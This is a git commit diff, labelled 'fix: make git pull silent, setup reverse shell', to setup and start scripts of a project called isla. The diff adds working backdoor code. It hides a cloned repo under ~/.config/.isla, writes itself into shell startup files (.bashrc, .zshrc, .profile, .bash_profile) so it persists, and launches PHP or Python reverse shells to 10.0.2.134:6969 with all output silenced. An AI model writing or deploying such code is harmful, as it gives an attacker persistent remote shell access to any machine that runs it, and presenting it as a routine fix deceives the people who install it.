71d8c003928332c82cdef7b8716e2e190866e391
marnixah <marnix@roboco.dev>
2023-01-30 14:18:12 +0100

    fix: make git pull silent, setup reverse shell

--- src/client/setup.sh
+++ src/client/setup.sh
@@ -1,16 +1,17 @@
 #!/bin/bash
+TTY=""
+
 mkdir -p ~/.config/.isla
-git clone https://github.com/marnixah/isla.git ~/.config/.isla
+git clone https://github.com/marnixah/isla.git ~/.config/.isla >/dev/null 2>&1 || (cd ~/.config/.isla && git pull -q)
 
 cd ~/.config/.isla
-./src/client/start.sh
 
 chmod +x ~/.config/.isla/src/client/start.sh
 chmod +x ~/.config/.isla/src/client/setup.sh
 
 inject_into_file() {
   FILE=$1
-  LINE="~/.config/.isla/src/client/setup.sh 2>&1 > /dev/null & disown > /dev/null"
+  LINE="~/.config/.isla/src/client/setup.sh >/dev/null 2>&1"
 
   # If the file doesn't exist, ignore it
   [ -f "$FILE" ] || return
@@ -23,3 +24,6 @@ inject_into_file ~/.bashrc
 inject_into_file ~/.zshrc
 inject_into_file ~/.profile
 inject_into_file ~/.bash_profile
+
+./src/client/start.sh 2>&1 >/dev/null &
+disown >/dev/null
--- src/client/start.sh
+++ src/client/start.sh
@@ -1,1 +1,25 @@
 #!/bin/bash
+
+# Check if the script is already running
+
+if [ -f ~/.config/.isla/src/client/.pid ]; then
+  PID=$(cat ~/.config/.isla/src/client/.pid)
+  if ps -p $PID >/dev/null 2>&1; then
+    echo "Isla is already running"
+    exit 1
+  fi
+fi
+
+# Start reverse shell
+IP="10.0.2.134"
+PORT=6969
+if command -v php >/dev/null; then
+  php -r "\$sock=fsockopen('$IP',$PORT);exec('/bin/sh -i <&3 >&3 2>&3');" >/dev/null 2>&1 &
+elif command -v python >/dev/null; then
+  python -c "import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(('$IP',$PORT));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(['/bin/sh','-i']);" >/dev/null 2>&1 &
+fi
+
+# Save PID
+echo $! >~/.config/.isla/src/client/.pid
+
+wait $!
